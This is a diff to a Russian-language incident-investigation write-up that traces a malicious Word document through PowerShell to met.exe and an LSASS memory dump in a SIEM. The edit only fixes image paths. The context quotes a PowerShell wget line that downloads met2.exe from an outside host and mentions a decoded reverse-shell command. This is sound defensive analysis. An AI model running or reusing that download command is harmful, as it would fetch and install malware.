@@ -46,7 +46,7 @@ event_src.host = 'sbx.city.stf' and object = 'malware' and (object.name contains
 event_src.host = 'sbx.city.stf' and object = 'malware' and object.name = 'Doc1.doc'
 ```
 
-![](../../../Attachments/figure-03.jpg)
+![](../../Attachments/figure-03.jpg)
 
 *Рисунок 3 — События песочницы, связанные с документом Doc1.doc*
 
@@ -66,7 +66,7 @@ event_src.host = 'sbx.city.stf' and object = 'malware' and object.name = 'Doc1.d
 event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process.cmdline contains 'Doc1.doc'
 ```
 
-![](../../../Attachments/figure-04.jpg)
+![](../../Attachments/figure-04.jpg)
 
 *Рисунок 4 — Пользователь, от имени которого запускался WINWORD.EXE*
 
@@ -84,7 +84,7 @@ event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process
 event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process.parent.id = '1852'
 ```
 
-![](../../../Attachments/figure-05.jpg)
+![](../../Attachments/figure-05.jpg)
 
 *Рисунок 5 — Дочерний PowerShell-процесс с PID 624*
 
@@ -98,7 +98,7 @@ event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process
 
 На последнем шаге у нас есть достаточно хорошая точка опоры — PowerShell с PID 624. Прежде чем искать его дочерние процессы, посмотрим на содержимое подозрительной команды. На приложенном фрагменте после декодирования видны обращения к System.Net.Sockets.TCPClient и обработка сетевого потока.
 
-![](../../../Attachments/figure-06.jpg)
+![](../../Attachments/figure-06.jpg)
 
 *Рисунок 6 — Закодированная команда PowerShell и фрагмент её содержимого*
 
@@ -108,7 +108,7 @@ event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process
 event_src.host = 'tsantos.uf.city.stf' and msgid in [1, 4688] and object.process.parent.id = '624'
 ```
 
-![](../../../Attachments/figure-07.jpg)
+![](../../Attachments/figure-07.jpg)
 
 *Рисунок 7 — Дочерние процессы PowerShell: в том числе met.exe*
 
@@ -138,7 +138,7 @@ body contains 'met.exe' AND event_src.host = "tsantos.uf.city.stf"
 try {wget http://rser.inostage.ru/XNzAOnof/met2.exe -O met.exe} catch {echo $_}
 ```
 
-![](../../../Attachments/figure-08.png)
+![](../../Attachments/figure-08.png)
 
 *Рисунок 8 — PowerShell 4104: команда загрузки met2.exe с сохранением в met.exe*
 
@@ -146,7 +146,7 @@ try {wget http://rser.inostage.ru/XNzAOnof/met2.exe -O met.exe} catch {echo $_}
 
 Sysmon Event ID 11 показывает, что процесс `powershell.exe` с PID 624 создал файл `C:\Users\t_santos\Documents\met.exe`. Таким образом, событие создания файла подтверждает появление `met.exe` на диске; последующее событие запуска процесса позволяет связать его с выполнением.
 
-![](../../../Attachments/figure-09.png)
+![](../../Attachments/figure-09.png)
 
 *Рисунок 9 — Sysmon 11: создание met.exe процессом PowerShell (PID 624)*
 
@@ -154,7 +154,7 @@ Sysmon Event ID 11 показывает, что процесс `powershell.exe` 
 
 Теперь нас интересует уже не PowerShell, а сам `met.exe`. В событиях Sysmon видим, что процесс с PID 2696 под учётной записью `t_santos` подключается к именованному каналу `wkssvc`. Это Sysmon Event ID 18 — Pipe Connected.
 
-![](../../../Attachments/figure-10.png)
+![](../../Attachments/figure-10.png)
 
 *Рисунок 10 — Sysmon 18: подключение met.exe к именованному каналу wkssvc*
 
@@ -164,7 +164,7 @@ Sysmon Event ID 11 показывает, что процесс `powershell.exe` 
 
 Следующая находка уже интереснее. Sysmon Event ID 3 фиксирует сетевое соединение, инициированное `met.exe` (PID 2696) с рабочей станции `10.156.18.200:57528` на адрес `10.126.10.30:10000`.
 
-![](../../../Attachments/figure-11.png)
+![](../../Attachments/figure-11.png)
 
 *Рисунок 11 — Sysmon 3: сетевое соединение met.exe с 10.126.10.30:10000*
 
@@ -174,7 +174,7 @@ Sysmon Event ID 11 показывает, что процесс `powershell.exe` 
 
 Наконец, находим событие Sysmon Event ID 10 — Process Access. В нём `met.exe` (PID 2696) обращается к процессу `lsass.exe` (PID 784), а в поле `GrantedAccess` указано значение `0x1010`.
 
-![](../../../Attachments/figure-12.png)
+![](../../Attachments/figure-12.png)
 
 *Рисунок 12 — Sysmon 10: доступ met.exe к процессу lsass.exe*
 
@@ -192,7 +192,7 @@ subject.process.name = 'met.exe' AND event_src.host = "tsantos.uf.city.stf"
 
 И почти сразу находится интересная запись. В Sysmon Event ID 11 (FileCreate) процесс `met.exe` с PID 2696 создаёт файл `nkcklq.dll` в пользовательском временном каталоге. Время создания — 22 ноября 2023 года, 17:30:53.890 UTC.
 
-![](../../../Attachments/figure-13.png)
+![](../../Attachments/figure-13.png)
 
 *Рисунок 13 — Sysmon 11: met.exe создаёт файл nkcklq.dll во временном каталоге*
 
@@ -200,13 +200,13 @@ subject.process.name = 'met.exe' AND event_src.host = "tsantos.uf.city.stf"
 
 А дальше SIEM сама связывает две находки. Срабатывает корреляционное правило `LSASS_Memory_Dump`, которое объединило два исходных события в интервале 17:30:53–17:31:09. В контексте инцидента указаны файл `nkcklq.dll` и предполагаемая компрометация пользователя `t_santos`.
 
-![](../../../Attachments/figure-14.png)
+![](../../Attachments/figure-14.png)
 
 *Рисунок 14 — Инцидент LSASS_Memory_Dump: объединение двух событий и контекст срабатывания*
 
 Если открыть подробности инцидента, видим прежний процесс `met.exe` (PID 2696), целевой `lsass.exe` (PID 784), изначальный процесс `powershell.exe` (PID 624), маску `GrantedAccess` = `0x1010` и тот же путь к `nkcklq.dll`. Здесь уже можно говорить не об одном случайном событии, а о связанной последовательности, которую SIEM классифицировала как дамп памяти LSASS.
 
-![](../../../Attachments/figure-15.png)
+![](../../Attachments/figure-15.png)
 
 *Рисунок 15 — Детали корреляции: met.exe, lsass.exe и подозрительный файл nkcklq.dll*
 
